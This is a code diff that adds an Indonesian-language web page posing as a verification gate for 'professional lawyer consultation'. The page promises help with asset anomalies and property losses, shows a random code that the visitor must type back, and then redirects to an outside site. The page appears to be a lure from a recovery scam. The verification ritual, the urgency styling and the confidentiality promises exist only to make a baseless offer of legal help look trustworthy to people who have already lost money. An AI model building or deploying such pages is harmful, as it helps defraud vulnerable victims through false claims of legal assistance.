@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verifikasi Konsultasi Pengacara Profesional</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Arial', sans-serif;
+      background: #121826;
+      color: #ffffff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 420px;
+      background: #1a2236;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6);
+      padding: 24px;
+      text-align: left;
+      position: relative;
+    }
+
+    .header {
+      font-size: 22px;
+      font-weight: bold;
+      color: #4e88ff;
+      margin-bottom: 24px;
+      text-align: center;
+      margin-top: 40px; /* Add extra margin to ensure visibility on mobile */
+    }
+
+    .content {
+      font-size: 15px;
+      line-height: 1.8;
+      color: #d1d1d1;
+      margin-bottom: 24px;
+    }
+
+    .highlight {
+      font-weight: bold;
+      color: #4e88ff;
+      display: block;
+      margin-bottom: 12px;
+    }
+
+    ul {
+      padding-left: 20px;
+      margin: 12px 0 24px;
+    }
+
+    ul li {
+      margin-bottom: 8px;
+    }
+
+    .code-section {
+      background: #28304a;
+      padding: 16px;
+      border-radius: 12px;
+      margin-bottom: 24px;
+      font-size: 18px;
+      font-weight: bold;
+      color: #ffffff;
+      letter-spacing: 1px;
+      text-align: center;
+    }
+
+    .code-number {
+      font-size: 36px;
+      color: #ff4757;
+      margin-top: 10px;
+      display: block;
+      text-shadow: 0 4px 8px rgba(255, 71, 87, 0.8);
+    }
+
+    .input-field {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 24px;
+    }
+
+    .input-field label {
+      width: 100%;
+      font-size: 14px;
+      color: #d1d1d1;
+      margin-bottom: 8px;
+    }
+
+    .input-field input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      border: 1px solid #4e88ff;
+      border-radius: 10px;
+      font-size: 16px;
+      background: #1a2236;
+      color: #ffffff;
+    }
+
+    .button {
+      width: 100%;
+      padding: 14px;
+      background: #4e88ff;
+      border: none;
+      border-radius: 10px;
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s, transform 0.2s;
+      animation: pulse 1.5s infinite;
+      text-transform: uppercase;
+    }
+
+    .button:disabled {
+      background: #555a75;
+      cursor: not-allowed;
+      animation: none;
+    }
+
+    @keyframes pulse {
+      0%, 100% {
+        transform: scale(1);
+      }
+      50% {
+        transform: scale(1.05);
+      }
+    }
+
+    .disclaimer {
+      font-size: 13px;
+      color: #a1a1a1;
+      margin-top: 24px;
+      text-align: center;
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #6f6f6f;
+      margin-top: 12px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">🔵 Verifikasi Konsultasi Pengacara Profesional</div>
+    <div class="content">
+      Untuk memastikan kualitas layanan kami dan memberikan bantuan yang dipersonalisasi, kami hanya menerima permintaan bantuan dari pengguna yang telah diverifikasi.
+      <span class="highlight">Hak Istimewa Bantuan Eksklusif!</span>
+      Selesaikan verifikasi sekarang untuk mendapatkan:
+      <ul>
+        <li>Konsultasi satu-satu dengan pengacara eksklusif</li>
+        <li>Bantuan untuk situasi anomali aset Anda</li>
+        <li>Solusi khusus berdasarkan riwayat Anda</li>
+        <li>Bantuan untuk semua masalah kerugian properti Anda</li>
+        <li>Prioritas jalur bantuan untuk mengurangi kerugian Anda</li>
+      </ul>
+    </div>
+    <div class="code-section">
+      <div>🔒 Masukkan kode berikut untuk mengakses pengacara profesional:</div>
+      <span class="code-number" id="randomCode">000</span>
+    </div>
+    <div class="input-field">
+      <label for="verificationCode">Masukkan Kode Verifikasi</label>
+      <input id="verificationCode" type="text" placeholder="Masukkan kode">
+      <button id="verifyButton" class="button" disabled onclick="redirect()">Verifikasi Sekarang</button>
+    </div>
+    <div class="disclaimer">
+      Harap diperhatikan: Semua informasi yang diberikan akan dijaga kerahasiaannya dan hanya digunakan untuk keperluan bantuan hukum.
+    </div>
+    <div class="footer">© 2025 Layanan Konsultasi Pengacara Profesional. Semua Hak Dilindungi.</div>
+  </div>
+
+  <script>
+    const randomCode = Math.floor(100 + Math.random() * 900); // Generate a random 3-digit code
+    const inputField = document.getElementById('verificationCode');
+    const verifyButton = document.getElementById('verifyButton');
+    const randomCodeElement = document.getElementById('randomCode');
+    const randomURL = `https://www.qq.com?id=${randomCode}`; // Generate a random URL
+
+    randomCodeElement.textContent = randomCode;
+
+    inputField.addEventListener('input', () => {
+      if (inputField.value === randomCode.toString()) {
+        verifyButton.disabled = false;
+      } else {
+        verifyButton.disabled = true;
+      }
+    });
+
+    function redirect() {
+      window.location.href = randomURL;
+    }
+  </script>
+</body>
+</html>
